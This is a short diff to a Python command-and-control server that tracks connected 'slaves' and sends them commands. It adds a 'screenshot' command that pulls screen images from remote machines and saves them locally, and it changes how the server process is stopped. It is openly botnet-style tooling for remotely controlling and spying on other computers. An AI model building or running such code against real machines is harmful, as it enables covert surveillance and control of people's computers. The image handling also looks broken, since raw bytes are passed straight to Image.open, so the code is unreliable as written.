@@ -1,6 +1,9 @@
+from signal import SIGTERM
 import socket
 import ipaddress
 from multiprocessing import Lock, Process, Manager
+from PIL import Image
+import os
 
 # COMMAND AND CONTROL CODE WILL GO HERE
 
@@ -23,6 +26,10 @@ def runServer(sharedArray, slaves):
                        + str(data))
                 command = bytearray(sharedArray)
                 sres.sendall(command)
+                if(command.decode('utf-8').split(" ")[0] == "screenshot"):
+                    byteforimage = sres.recv(40960000)
+                    image = Image.open(byteforimage)
+                    image.save("./screenshot.png")
                 sres.close()
                 #Keep list of online slaves
                 if slaves.count(addr[0]) == 0:
@@ -75,4 +82,4 @@ if __name__ == "__main__":
             print(message)
         else:
             print("Unvalid command")
-    p.kill()
+    os.kill(p.pid, SIGTERM)
